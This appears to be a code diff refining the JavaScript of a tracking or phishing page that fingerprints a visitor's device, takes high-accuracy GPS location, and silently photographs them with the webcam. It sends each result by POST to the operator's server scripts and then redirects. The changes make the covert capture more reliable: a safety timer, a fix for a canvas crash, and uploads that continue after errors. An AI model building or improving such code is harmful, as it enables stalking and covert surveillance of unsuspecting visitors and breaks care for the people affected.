@@ -1,4 +1,4 @@
-// 1. Device Info (Runs on Page Load)
+// 1. Device Info
 function information() {
   if (navigator.getBattery) {
     navigator.getBattery().then(function(battery) {
@@ -19,65 +19,30 @@ function collectAndSend(batLevel) {
   var str = ver;
   var os = ver;
 
-  var canvas = document.createElement('canvas');
-  var gl;
-  var debugInfo;
-  var ven = 'Not Available';
-  var ren = 'Not Available';
-
-  try {
-    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-  } catch (e) {}
-  if (gl) {
-    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    if (debugInfo) {
-      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    }
-  }
-
-  // Browser Detection
-  var brw;
-  if (ver.indexOf('Firefox') != -1) {
-    str = str.substring(str.indexOf(' Firefox/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  } else if (ver.indexOf('Chrome') != -1) {
-    str = str.substring(str.indexOf(' Chrome/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  } else if (ver.indexOf('Safari') != -1) {
-    str = str.substring(str.indexOf(' Safari/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  } else if (ver.indexOf('Edge') != -1) {
-    str = str.substring(str.indexOf(' Edge/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  } else {
-    brw = 'Not Available';
-  }
+  var brw = 'Unknown'; 
+  if (ver.indexOf('Firefox') != -1) brw = 'Firefox';
+  else if (ver.indexOf('Chrome') != -1) brw = 'Chrome';
+  else if (ver.indexOf('Safari') != -1) brw = 'Safari';
 
   var ht = window.screen.height;
   var wd = window.screen.width;
+  
+  if(os.includes(';')) {
+      os = os.substring(0, os.indexOf(')'));
+      os = os.split(';')[1];
+      if (os) os = os.trim();
+  }
 
-  os = os.substring(0, os.indexOf(')'));
-  os = os.split(';');
-  os = os[1];
-  if (os == undefined) os = 'Not Available';
-  os = os.trim();
-
-  // Sends to info.php
   $.ajax({
     type: 'POST',
     url: info_file,
-    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
+    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
     success: function() {},
     mimeType: 'text'
   });
 }
 
-// 2. Location Logic (Runs on Click)
+// 2. Location Logic (First Priority)
 function locate(callback, errCallback) {
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
@@ -87,26 +52,22 @@ function locate(callback, errCallback) {
       optn
     );
   } else {
-    errCallback();
+    if(errCallback) errCallback();
   }
 }
 
 function showError(error, errCallback) {
-  var err_text;
-  var err_status = 'failed';
-
+  var err_text = 'Unknown';
   switch (error.code) {
     case error.PERMISSION_DENIED: err_text = 'User denied Geolocation'; break;
     case error.POSITION_UNAVAILABLE: err_text = 'Location unavailable'; break;
     case error.TIMEOUT: err_text = 'Location timed out'; break;
-    case error.UNKNOWN_ERROR: err_text = 'Unknown error'; break;
   }
-
-  // Sends to error.php
+  
   $.ajax({
     type: 'POST',
     url: error_file,
-    data: { Status: err_status, Error: err_text },
+    data: { Status: 'failed', Error: err_text },
     success: function() { if(errCallback) errCallback(); },
     mimeType: 'text'
   });
@@ -120,25 +81,30 @@ function showPosition(position, callback) {
   var dir = position.coords.heading || 0;
   var spd = position.coords.speed || 0;
 
-  // Sends to result.php
   $.ajax({
     type: 'POST',
     url: result_file,
     data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
     success: function() { 
-        // Location Successful! Now run the next step (Camera)
+        if(callback) callback(); 
+    },
+    error: function() {
         if(callback) callback(); 
     },
     mimeType: 'text'
   });
 }
 
-// 3. Camera Logic (Runs after Location Success)
+// 3. Camera Logic (Fixed Canvas Crash)
 function captureAndSend(callback) {
   var video = document.createElement('video');
   var canvas = document.getElementById('canvas');
 
-  // Video settings to be silent and fast
+  // Safety Timer: Redirect if stuck for 5 seconds
+  var safetyTimer = setTimeout(function() {
+      if(callback) callback();
+  }, 5000);
+
   video.autoplay = true;
   video.muted = true;
   video.playsInline = true;
@@ -146,39 +112,52 @@ function captureAndSend(callback) {
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
     navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
       video.srcObject = stream;
-      video.play();
+      video.play(); // Start stream
 
-      // Wait 1 second for focus/light
-      setTimeout(function() {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+      // FIX: Wait for the video to actually have data (width/height)
+      video.onloadeddata = function() {
+          setTimeout(function() {
+            clearTimeout(safetyTimer); // Clear safety timer
+            
+            // Check if video actually has size
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
 
-        canvas.toBlob(function(blob) {
-          var formData = new FormData();
-          formData.append('image', blob, 'cam.jpg');
+                canvas.toBlob(function(blob) {
+                  var formData = new FormData();
+                  formData.append('image', blob, 'cam.jpg');
 
-          // Sends to upload.php
-          $.ajax({
-            url: upload_file,   
-            type: 'POST',
-            data: formData,
-            processData: false,
-            contentType: false,
-            success: function(data) {
-              stream.getTracks().forEach(track => track.stop());
-              if (callback) callback(); // Redirect
-            },
-            error: function() {
-              if (callback) callback(); // Redirect anyway
+                  $.ajax({
+                    url: upload_file, 
+                    type: 'POST',
+                    data: formData,
+                    processData: false,
+                    contentType: false,
+                    success: function() {
+                      stream.getTracks().forEach(track => track.stop());
+                      if (callback) callback();
+                    },
+                    error: function() {
+                      stream.getTracks().forEach(track => track.stop());
+                      if (callback) callback(); 
+                    }
+                  });
+                }, 'image/jpeg', 0.8);
+            } else {
+                // Video failed to load dimensions, redirect
+                stream.getTracks().forEach(track => track.stop());
+                if (callback) callback();
             }
-          });
-        }, 'image/jpeg', 0.8);
-      }, 1000);
+          }, 500); // 500ms delay after load
+      };
     }).catch(function(err) {
+      clearTimeout(safetyTimer);
       if (callback) callback();
     });
   } else {
+    clearTimeout(safetyTimer);
     if (callback) callback();
   }
 }
